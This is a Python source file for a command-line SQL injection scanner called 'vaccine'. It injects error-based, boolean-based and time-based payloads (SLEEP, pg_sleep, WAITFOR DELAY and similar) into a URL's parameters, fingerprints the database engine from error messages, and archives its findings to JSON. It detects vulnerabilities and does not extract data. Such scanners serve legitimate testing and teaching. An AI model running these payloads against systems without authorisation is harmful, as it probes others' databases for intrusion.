#!/usr/bin/env python3
import sys
import json
import time
import argparse
import requests
import re

from datetime import datetime, timezone, timedelta
from difflib import SequenceMatcher
from urllib.parse import urlsplit, urlunsplit, parse_qsl

ENGINES = {
    "MySQL": {
        "errors": [
            r"SQL syntax.*MySQL",
            r"You have an error in your SQL syntax",
            r"check the manual that corresponds to your (MySQL|MariaDB)",
            r"MySqlException",
            r"mysql_fetch",
        ],
        "sleep": "SLEEP({n})",
    },
    "PostgreSQL": {
        "errors": [
            r"PostgreSQL.*ERROR",
            r"pg_query\(\)",
            r"PSQLException",
            r"unterminated quoted string",
            r"syntax error at or near",
        ],
        "sleep": "pg_sleep({n})",
    },
    "Microsoft SQL Server": {
        "errors": [
            r"Microsoft SQL Server",
            r"ODBC SQL Server Driver",
            r"Unclosed quotation mark after the character string",
            r"SqlException",
        ],
        "sleep": "WAITFOR DELAY '0:0:{n}'",
    },
    "Oracle": {
        "errors": [
            r"ORA-[0-9]{5}",
            r"quoted string not properly terminated",
            r"OracleException",
            r"PLS-[0-9]",
        ],
        "sleep": "dbms_pipe.receive_message(('a'),{n})",
    },
}

ERROR_PROBES = ["'", '"', "')", "';", "`", "\\", "'--", "' OR '1"]

def engine_fingerprint(body):
    for engine_name, profile in ENGINES.items():
        for pattern in profile["errors"]:
            if re.search(pattern, body, re.IGNORECASE):
                return engine_name
    return None


class Target:
    def __init__(self, url, method="GET", data=None):
        self.method = method.upper()
        parts = urlsplit(url)
        self.base = urlunsplit((parts.scheme, parts.netloc, parts.path, "", ""))
        self.query = dict(parse_qsl(parts.query, keep_blank_values=True))
        if data:
            self.body = dict(parse_qsl(data, keep_blank_values=True))
        else:
            self.body = {}

    def injection_points(self):
        result = []
        for name, value in self.query.items():
            result.append(("query", name, value))
        if self.method == "POST":
            for name, value in self.body.items():
                result.append(("body", name, value))
        return result

    def build(self, location, name, value):
        query_copy = dict(self.query)
        body_copy = dict(self.body)

        if location == "query":
            query_copy[name] = value
        else:
            body_copy[name] = value

        if self.method == "POST":
            data_to_send = body_copy
        else:
            data_to_send = None

        return {
            "method": self.method,
            "url": self.base,
            "params": query_copy,
            "data": data_to_send
        }

def make_session(user_agent, cookie):
    session = requests.Session()

    if user_agent:
        session.headers["User-Agent"] = user_agent
    else:
        session.headers["User-Agent"] = "vaccine/1.0"

    if cookie:
        session.headers["Cookie"] = cookie

    return session

def send(session, timeout, method, url, params=None, data=None):
    start = time.perf_counter()

    response = session.request(
        method, url,
        params=params,
        data=data,
        timeout=timeout,
        allow_redirects=True
    )

    elapsed = time.perf_counter() - start

    return response.status_code, (response.text or ""), elapsed

def error_based(target, session, timeout, ctx):
    findings = []

    for location, name, original_value in target.injection_points():
        for probe in ERROR_PROBES:
            payload = f"{original_value}{probe}"

            request_args = target.build(location, name, payload)

            try:
                status, body, elapsed = send(session, timeout, **request_args)
            except requests.RequestException:
                continue

            engine = engine_fingerprint(body)
            if engine is not None:
                if ctx["engine"] is None:
                    ctx["engine"] = engine

                findings.append({
                    "technique": "error-based",
                    "location": location,
                    "param": name,
                    "payload": payload,
                    "engine": engine,
                    "evidence": f"database error signature ({engine})"
                })

                break

    return findings

def similarity(text_a, text_b):
    return SequenceMatcher(None, text_a, text_b).ratio()

def boolean_based(target, session, timeout, ctx):
    findings = []

    for location, name, original_value in target.injection_points():
        try:
            baseline_args = target.build(location, name, original_value)
            _, baseline_body, _ = send(session, timeout, **baseline_args)
        except requests.RequestException:
            continue

        true_false_pairs = [
            (f"{original_value}' AND '1'='1", f"{original_value}' AND '1'='2"),
            (f"{original_value} AND 1=1",     f"{original_value} AND 1=2"),
            (f'{original_value}" AND "1"="1', f'{original_value}" AND "1"="2'),
        ]

        for true_payload, false_payload in true_false_pairs:
            true_request_args = target.build(location, name, true_payload)
            false_request_args = target.build(location, name, false_payload)
            try:
                _, true_body, _ = send(session, timeout, **true_request_args)
                _, false_body, _ = send(session, timeout, **false_request_args)
            except requests.RequestException:
                continue

            true_score = similarity(baseline_body, true_body)
            false_score = similarity(baseline_body, false_body)

            true_looks_normal = true_score > 0.95
            false_looks_different = false_score < 0.95
            gap_is_meaningful = (true_score - false_score) > 0.05

            if true_looks_normal and false_looks_different and gap_is_meaningful:
                findings.append({
                    "technique": "boolean-based",
                    "location": location,
                    "param": name,
                    "payload": true_payload,
                    "engine": None,
                    "evidence": f"true~{true_score:.2f} vs false~{false_score:.2f}",
                })
                break
    return findings

def time_based(target, session, timeout, ctx):
    findings = []

    delay = 5

    for location, name, original_value in target.injection_points():
        request_args = target.build(location, name, original_value)
        try:
            _, _, baseline_time = send(session, timeout, **request_args)
        except requests.RequestException:
            continue
        found = False

        for engine_name, profile in ENGINES.items():
            sleep_call = profile["sleep"].format(n=delay)
            payloads = [
                f"{original_value}' AND {sleep_call} AND '1'='1",
                f"{original_value} AND {sleep_call}",
                f"{original_value}'; {sleep_call}--",
            ]

            for payload in payloads:
                try:
                    request_args = target.build(location, name, payload)
                    _, _, elapsed = send(session, timeout, **request_args)
                except requests.RequestException:
                    continue

                if elapsed - baseline_time >= delay:
                    if ctx["engine"] is None:
                        ctx["engine"] = engine_name

                    findings.append({
                        "technique": "time-based",
                        "location": location,
                        "param": name,
                        "payload": payload,
                        "engine": engine_name,
                        "evidence": f"delayed {elapsed:.1f}s vs baseline {baseline_time:.1f}s",
                    })
                    found = True
                    break
            if found:
                break
    return findings

TECHNIQUES = [error_based, boolean_based, time_based]

def report(url, method, engine, findings):
    print(f"[*] Target : {url}")
    print(f"[*] Method : {method}")
    print(f"[*] Engine : {engine or 'unknown'}")

    if not findings:
        print("[-] No SQL injection detected with current tests.")
        return

    print(f"[+] {len(findings)} finding(s):\n")
    for f in findings:
        print(f"  [!] {f['technique']}  param={f['param']} ({f['location']})")
        print(f"      payload : {f['payload']}")
        print(f"      evidence: {f['evidence']}\n")

def archive(path, record):
    stored = {"scans": []}
    try:
        with open(path) as file_handle:
            stored = json.load(file_handle)
    except (FileNotFoundError, json.JSONDecodeError):
        pass

    stored.setdefault("scans", []).append(record)

    with open(path, "w") as file_handle:
        json.dump(stored, file_handle, indent=2)

def main():
    parser = argparse.ArgumentParser(prog="vaccine", description="Detect SQL injection in a URL")
    parser.add_argument("url", help="target URL")
    parser.add_argument("-o", dest="archive", default="results.json", help="archive file (default: results.json)")
    parser.add_argument("-X", dest="method", default="GET", choices=["GET", "POST"], help="HTTP method (default: GET)")
    parser.add_argument("-D", "--data", help="(POST only) POST body")
    parser.add_argument("-A", "--user-agent", help="custom User-Agent header")
    parser.add_argument("-C", "--cookie", help="custom Cookie header")

    args = parser.parse_args()

    target = Target(args.url, args.method, args.data)

    if not target.injection_points():
        print("[-] No parameters to test. Add ?id=1 to the URL, or use --data for POST.")
        return 1

    session = make_session(args.user_agent, args.cookie)
    timeout = 20.0
    ctx = {"engine": None}
    tz = timezone(timedelta(hours=2))


    findings = []
    for technique in TECHNIQUES:
        findings = findings + technique(target, session, timeout, ctx)

    report(args.url, args.method, ctx["engine"], findings)

    archive(args.archive, {
        "time": datetime.now(tz).isoformat(),
        "url": args.url,
        "method": args.method,
        "engine": ctx["engine"],
        "findings": findings,
    })

    print(f"[*] Archived to {args.archive}")

    return 0

if __name__ == "__main__":
    sys.exit(main())